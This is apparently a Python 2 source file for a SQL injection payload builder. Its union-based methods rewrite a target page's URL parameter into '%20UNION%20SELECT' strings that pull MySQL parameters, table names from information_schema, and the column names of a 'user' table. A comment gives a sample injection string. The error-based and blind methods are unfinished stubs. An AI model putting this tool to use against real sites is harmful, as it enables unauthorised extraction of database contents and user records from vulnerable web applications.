#!/usr/bin/python

class Builder:
    """ Builds the following SQLi types:
        i)      Error-based
        ii)     Union-based
        iii)    Blind 
    """

    def __init__(self, page, mysql_params):
        self.params = []
        self.offset = 0
        self.delimiter = '%20'
        self.union_string = self.delimiter + 'UNION' + self.delimiter + 'SELECT' 
        self.null_url = page.split('=')[0] + '=null'

        self.page = page
        self.union_params = mysql_params

    def error():
        return 0

    def union(self, num_cols, magic_col):
        """ :num_cols:  Number of columns for UNION statement.
            :magic_col: Column number that is most visible, and therefore used for injection parameter.
            :returns:   All basic union-based injections as a dict of strings.
        """
        injections = {}
        union_urls = [self.delimiter + str(i + self.offset) for i in xrange(1, num_cols + 1)]
        for param in self.union_params:
            union_urls[magic_col - 1] = self.delimiter + param

            injections[param] = (self.null_url + self.union_string + ','.join(union_urls))
        return injections 

    def schema_union(self, num_cols, magic_col):
        """ :num_cols:  Number of columns for UNION statement.
            :magic_col: Column number that is most visible, and therefore used for injection parameter.
            :returns:   Advanced union-based injections as a dict of strings.
        """
        union_urls = [self.delimiter + str(i + self.offset) for i in xrange(1, num_cols + 1)]
        union_urls[magic_col - 1] = self.delimiter + 'table_name' 

        injection = self.null_url + self.union_string + ','.join(union_urls)
        injection += self.delimiter + 'from' + self.delimiter + 'information_schema.columns'
        return {'table_name': injection}

    
    def user_table(self, num_cols, magic_col):
        #?id=-1 union select 1,2,3,4,5,6,column_name from information_schema.columns where table_name = 'user'
        union_urls = [self.delimiter + str(i + self.offset) for i in xrange(1, num_cols + 1)]
        union_urls[magic_col - 1] = self.delimiter + 'column_name' 
        a = self.null_url + self.delimiter + self.union_string + ','.join(union_urls)
        a += self.delimiter + 'from' + self.delimiter + 'information_schema.columns'
        a += self.delimiter + 'where table_name = \'user\''
        #print a
        return {'user table' : a}


    def blind():
        return 0



#

